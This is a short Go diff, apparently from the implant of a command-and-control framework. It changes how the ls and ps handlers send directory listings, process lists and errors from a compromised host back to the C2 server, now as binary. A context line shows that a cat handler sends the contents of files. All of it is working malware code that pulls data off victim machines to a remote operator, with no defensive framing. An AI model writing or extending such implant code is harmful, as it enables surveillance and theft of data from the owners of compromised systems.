@@ -18,10 +18,11 @@ func LsCmdRun(cmd *cobra.Command, args []string) {
 	}
 	out, err := util.LsPath(target_dir)
 	if err != nil {
-		out = err.Error()
+		c2transport.NotifyC2(cmd, "Failed to ls %s: %v", target_dir, err)
+		return
 	}
 
-	c2transport.NotifyC2(cmd, "%s", out)
+	c2transport.NotifyC2Binary(cmd, out)
 }
 
 func PsCmdRun(cmd *cobra.Command, args []string) {
@@ -35,7 +36,7 @@ func PsCmdRun(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Failed to ps: %v", err)
 		return
 	}
-	c2transport.NotifyC2(cmd, "%s", out)
+	c2transport.NotifyC2Binary(cmd, out)
 }
 
 // CatCmdRun reads and sends the contents of the specified file.
